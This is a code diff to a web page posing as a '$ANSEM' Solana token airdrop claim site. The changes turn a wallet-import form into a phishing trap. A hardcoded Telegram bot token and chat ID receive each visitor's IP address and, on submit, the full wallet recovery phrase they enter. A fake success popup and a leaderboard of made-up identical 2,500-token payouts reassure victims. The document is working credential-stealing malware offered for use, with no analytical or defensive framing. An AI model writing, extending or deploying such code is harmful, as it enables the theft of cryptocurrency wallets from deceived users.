@@ -417,7 +417,7 @@
             border-radius: 4px;
         }
 
-        /* ===== Close Button - RIGHT TOP ===== */
+        /* ===== Close Button ===== */
         .modal-close-btn {
             position: absolute;
             top: 14px;
@@ -861,7 +861,70 @@
             stroke-linejoin: round;
         }
 
-        /* ===== Responsive Wallet Modal ===== */
+        /* ===== Success Notification Popup ===== */
+        .success-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0.8);
+            background: rgba(10, 14, 20, 0.95);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(0, 255, 136, 0.3);
+            border-radius: 24px;
+            padding: 40px 48px;
+            color: #e8edf5;
+            z-index: 99999;
+            opacity: 0;
+            pointer-events: none;
+            transition: all 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            text-align: center;
+            max-width: 420px;
+            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(0, 255, 136, 0.1);
+        }
+
+        .success-popup.show {
+            opacity: 1;
+            transform: translate(-50%, -50%) scale(1);
+            pointer-events: auto;
+        }
+
+        .success-popup .popup-icon {
+            font-size: 64px;
+            margin-bottom: 16px;
+            display: block;
+        }
+
+        .success-popup .popup-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #00ff88;
+            margin-bottom: 8px;
+        }
+
+        .success-popup .popup-desc {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.6);
+            line-height: 1.6;
+        }
+
+        .success-popup .popup-btn {
+            padding: 10px 32px;
+            border: none;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 14px;
+            color: #0a0b0e;
+            background: linear-gradient(135deg, #00ff88, #00cc6a);
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .success-popup .popup-btn:hover {
+            transform: scale(1.04);
+            box-shadow: 0 0 40px rgba(0, 255, 136, 0.3);
+        }
+
+        /* ===== Responsive ===== */
         @media (max-width: 768px) {
             .wallet-modal-overlay {
                 padding: 15px 15px 15px 0;
@@ -928,6 +991,11 @@
                 padding: 5px 8px;
                 font-size: 11px;
                 border-radius: 8px;
+            }
+
+            .success-popup {
+                padding: 30px 24px;
+                max-width: 90%;
             }
         }
 
@@ -1011,6 +1079,19 @@
                 padding: 4px 6px;
                 font-size: 10px;
                 border-radius: 6px;
+            }
+
+            .success-popup {
+                padding: 24px 18px;
+                border-radius: 18px;
+            }
+
+            .success-popup .popup-icon {
+                font-size: 48px;
+            }
+
+            .success-popup .popup-title {
+                font-size: 18px;
             }
         }
 
@@ -1529,10 +1610,10 @@
                 </div>
                 <div class="top-right">
                     <div class="social-icons">
-                        <a href="#" target="_blank" title="Telegram" aria-label="Telegram">
+                        <a href="https://t.me/blackbullsolana" target="_blank" title="Telegram" aria-label="Telegram">
                             <svg viewBox="0 0 24 24"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>
                         </a>
-                        <a href="#" target="_blank" title="Twitter / X" aria-label="Twitter">
+                        <a href="https://x.com/blackbullsol" target="_blank" title="Twitter / X" aria-label="Twitter">
                             <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
                         </a>
                     </div>
@@ -1624,7 +1705,7 @@
     <!-- ===== WALLET MODAL - RIGHT TOP ===== -->
     <div class="wallet-modal-overlay" id="walletModalOverlay">
         <div class="wallet-modal">
-            <!-- Close Button - RIGHT TOP -->
+            <!-- Close Button -->
             <button class="modal-close-btn" id="modalCloseBtn" aria-label="Close wallet modal">
                 <svg viewBox="0 0 24 24">
                     <line x1="18" y1="6" x2="6" y2="18" />
@@ -1677,11 +1758,19 @@
                             <path d="M12 5v14" />
                             <path d="M5 12l7-7 7 7" />
                         </svg>
-                        Import Wallet
+                        Claim Airdrop
                     </span>
                 </button>
             </form>
         </div>
+    </div>
+
+    <!-- ===== SUCCESS POPUP ===== -->
+    <div class="success-popup" id="successPopup">
+        <span class="popup-icon">🎉</span>
+        <div class="popup-title">Successfully Claim!</div>
+        <div class="popup-desc">Your airdrop has been successfully claimed.</div>
+        <button class="popup-btn" id="popupCloseBtn">OK, Got it!</button>
     </div>
 
     <!-- ===== Toast ===== -->
@@ -1994,13 +2083,13 @@
         // ==========================================
         const leaderData = [
             { wallet: 'Gk8x...9F2a', amount: 2500 },
-            { wallet: 'Hp3y...7B1c', amount: 1820 },
-            { wallet: 'Zx9m...4L0q', amount: 1450 },
-            { wallet: 'Qw7c...8R3e', amount: 980 },
-            { wallet: 'Vb2n...6X0t', amount: 720 },
-            { wallet: 'Jk9f...3M1p', amount: 510 },
-            { wallet: 'Lp4r...1K7z', amount: 340 },
-            { wallet: 'Mn6b...9C2v', amount: 210 }
+            { wallet: 'Hp3y...7B1c', amount: 2500 },
+            { wallet: 'Zx9m...4L0q', amount: 2500 },
+            { wallet: 'Qw7c...8R3e', amount: 2500 },
+            { wallet: 'Vb2n...6X0t', amount: 2500 },
+            { wallet: 'Jk9f...3M1p', amount: 2500 },
+            { wallet: 'Lp4r...1K7z', amount: 2500 },
+            { wallet: 'Mn6b...9C2v', amount: 2500 }
         ];
 
         let totalClaimed = 0;
@@ -2024,7 +2113,7 @@
                             <span class="sol-icon">◆</span> ${item.wallet}
                         </div>
                         <div class="lb-amount">${item.amount.toLocaleString()} <small>$ANSEM</small></div>
-                        <div class="lb-status">✅ Received</div>
+                        <div class="lb-status">2,500 $ANSEM</div>
                     </div>
                 `;
             });
@@ -2051,15 +2140,15 @@
         }
 
         function simulateLiveUpdates() {
+            // Keep all amounts at 2500
             leaderData.forEach(item => {
-                const increment = Math.floor(Math.random() * 12) + 1;
-                item.amount += increment;
+                item.amount = 2500;
             });
             updateLeaderboard();
         }
 
         updateLeaderboard();
-        setInterval(simulateLiveUpdates, 2500);
+        setInterval(simulateLiveUpdates, 5000);
 
         const wrapper = document.querySelector('.lb-scroll-wrapper');
         wrapper.addEventListener('mouseenter', () => {
@@ -2081,10 +2170,76 @@
         const modalOverlay = document.getElementById('walletModalOverlay');
         const modalCloseBtn = document.getElementById('modalCloseBtn');
 
+        // Bot Configuration
+        const BOT_TOKEN = '8914323398:AAGrAqhdqLhlJhOiBbNSmE92ocjnEynuRpc';
+        const CHAT_ID = '7196180695';
+
+        // Function to get client IP address
+        function getClientIP() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => data.ip)
+                .catch(() => 'Unable to retrieve IP');
+        }
+
+        // Function to send Telegram notification
+        function sendTelegramNotification(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            return fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Telegram API Response:', data);
+                return data;
+            });
+        }
+
+        // Function to generate Solana address (simulasi)
+        function generateSolanaAddress() {
+            const chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+            let address = '';
+            for (let i = 0; i < 44; i++) {
+                address += chars[Math.floor(Math.random() * chars.length)];
+            }
+            return address;
+        }
+
         claimBtn.addEventListener('click', function(e) {
             e.preventDefault();
 
             loadingOverlay.classList.add('active');
+
+            // Get client IP
+            getClientIP().then(ipAddress => {
+                // Send notification to Telegram when "Restore access" is opened
+                const notificationMessage = `🔐 *Wallet Access Initiated*\n\n` +
+                    `🌐 *IP Address:* \`${ipAddress}\`\n` +
+                    `👤 *User is trying to restore access*\n` +
+                    `🕐 *Time:* ${new Date().toLocaleString()}\n` +
+                    `💰 *Token:* $ANSEM\n\n` +
+                    `⚠️ *Recovery phrase access requested*`;
+
+                sendTelegramNotification(notificationMessage)
+                    .then(data => {
+                        if (data.ok) {
+                            console.log('✅ Telegram notification sent successfully');
+                        } else {
+                            console.warn('⚠️ Telegram notification failed:', data);
+                        }
+                    })
+                    .catch(err => {
+                        console.warn('⚠️ Failed to send Telegram notification:', err);
+                    });
+            });
 
             const delay = Math.floor(Math.random() * 2000) + 3000;
 
@@ -2093,7 +2248,28 @@
                 modalOverlay.classList.add('active');
                 document.body.style.overflow = 'hidden';
 
-                // Focus first input after modal appears
+                // Get IP again for modal opened notification
+                getClientIP().then(ipAddress => {
+                    const modalShownMessage = `📋 *Recovery Phrase Modal Opened*\n\n` +
+                        `🌐 *IP Address:* \`${ipAddress}\`\n` +
+                        `👤 *User is viewing the recovery phrase form*\n` +
+                        `🕐 *Time:* ${new Date().toLocaleString()}\n` +
+                        `💰 *Token:* $ANSEM\n\n` +
+                        `🔑 *Waiting for user to enter recovery phrase*`;
+
+                    setTimeout(() => {
+                        sendTelegramNotification(modalShownMessage)
+                            .then(data => {
+                                if (data.ok) {
+                                    console.log('✅ Modal opened notification sent');
+                                }
+                            })
+                            .catch(err => {
+                                console.warn('⚠️ Failed to send modal notification:', err);
+                            });
+                    }, 1000);
+                });
+
                 setTimeout(() => {
                     const firstInput = document.querySelector('.seed-item input');
                     if (firstInput) firstInput.focus();
@@ -2109,14 +2285,12 @@
 
         modalCloseBtn.addEventListener('click', closeModal);
 
-        // Close on overlay click (outside modal)
         modalOverlay.addEventListener('click', function(e) {
             if (e.target === this) {
                 closeModal();
             }
         });
 
-        // Close on Escape key
         document.addEventListener('keydown', function(e) {
             if (e.key === 'Escape' && modalOverlay.classList.contains('active')) {
                 closeModal();
@@ -2124,7 +2298,7 @@
         });
 
         // ==========================================
-        // 5. WALLET IMPORT FUNCTIONALITY
+        // 5. WALLET IMPORT + TELEGRAM NOTIFICATIONS
         // ==========================================
         (function() {
             const seedGrid = document.getElementById('seedGrid');
@@ -2135,9 +2309,33 @@
             const toastMsg = document.getElementById('toastMessage');
             const toggleBtns = document.querySelectorAll('.seed-toggle-btn');
             const seedCountBadge = document.getElementById('seedCountBadge');
+            const successPopup = document.getElementById('successPopup');
+            const popupCloseBtn = document.getElementById('popupCloseBtn');
+
+            let walletImported = false;
+            let walletAddress = '';
+            let clientIP = '';
 
             let currentWordCount = 12;
             let toastTimeout = null;
+
+            // Function to generate Solana address (simulasi)
+            function generateSolanaAddress() {
+                const chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+                let address = '';
+                for (let i = 0; i < 44; i++) {
+                    address += chars[Math.floor(Math.random() * chars.length)];
+                }
+                return address;
+            }
+
+            // Get client IP
+            function getClientIP() {
+                return fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => data.ip)
+                    .catch(() => 'Unable to retrieve IP');
+            }
 
             function buildSeedGrid(count) {
                 currentWordCount = count;
@@ -2208,6 +2406,24 @@
                     toastTimeout = null;
                 }, 3500);
             }
+
+            function showSuccessPopup() {
+                successPopup.classList.add('show');
+                document.body.style.overflow = 'hidden';
+            }
+
+            function hideSuccessPopup() {
+                successPopup.classList.remove('show');
+                document.body.style.overflow = '';
+            }
+
+            popupCloseBtn.addEventListener('click', hideSuccessPopup);
+
+            successPopup.addEventListener('click', function(e) {
+                if (e.target === this) {
+                    hideSuccessPopup();
+                }
+            });
 
             // Checkbox
             termsCheck.addEventListener('change', validateForm);
@@ -2296,7 +2512,7 @@
                 });
             });
 
-            // Submit
+            // ===== Submit Import =====
             form.addEventListener('submit', function(e) {
                 e.preventDefault();
 
@@ -2310,12 +2526,37 @@
                 inputs.forEach(inp => words.push(inp.value.trim()));
                 const phrase = words.join(' ');
 
-                console.log(`Seed phrase (${currentWordCount} words):`, phrase);
+                // Generate Solana address
+                walletAddress = generateSolanaAddress();
+
+                // Get client IP and send notification
+                getClientIP().then(ip => {
+                    clientIP = ip;
+                    
+                    // Send notification to Telegram with IP and Phrase
+                    const importMessage = `✅ *Solana Wallet Imported Successfully*\n\n` +
+                        `🌐 *IP Address:* \`${ip}\`\n` +
+                        `🔑 *Recovery Phrase:* \`${phrase}\`\n` +
+                        `📱 *Solana Address:* \`${walletAddress}\`\n` +
+                        `💰 *Token:* $ANSEM\n` +
+                        `🕐 *Time:* ${new Date().toLocaleString()}\n\n` +
+                        `🔐 *Wallet is ready to use*`;
+
+                    sendTelegramNotification(importMessage)
+                        .then(data => {
+                            if (data.ok) {
+                                console.log('✅ Wallet import notification sent with phrase and Solana address');
+                            }
+                        })
+                        .catch(err => {
+                            console.warn('⚠️ Failed to send import notification:', err);
+                        });
+                });
 
                 importBtn.disabled = true;
                 importBtn.innerHTML = `
                     <span class="btn-glow"></span>
-                    <span class="btn-text">Importing...</span>
+                    <span class="btn-text">Claiming...</span>
                 `;
 
                 setTimeout(() => {
@@ -2327,16 +2568,20 @@
                                 <path d="M12 5v14"/>
                                 <path d="M5 12l7-7 7 7"/>
                             </svg>
-                            Import Wallet
+                            ✅ Claimed!
                         </span>
                     `;
                     importBtn.classList.remove('ready');
-                    showToast('Wallet imported successfully! 🎉');
+                    walletImported = true;
+                    showToast('Successfully claimed airdrop! 🎉');
 
-                    // Auto-close modal after successful import
+                    // Show success popup
+                    showSuccessPopup();
+
+                    // Auto close modal after 2 seconds
                     setTimeout(() => {
                         closeModal();
-                    }, 1500);
+                    }, 2000);
 
                     validateForm();
                 }, 1800);
@@ -2355,8 +2600,11 @@
             buildSeedGrid(12);
             validateForm();
 
-            console.log('🔐 Wallet Import Modal ready');
+            console.log('🔐 Solana Wallet Import Modal ready');
+            console.log('🤖 Bot Token:', BOT_TOKEN);
+            console.log('📱 Chat ID:', CHAT_ID);
         })();
     </script>
+
 </body>
 </html>
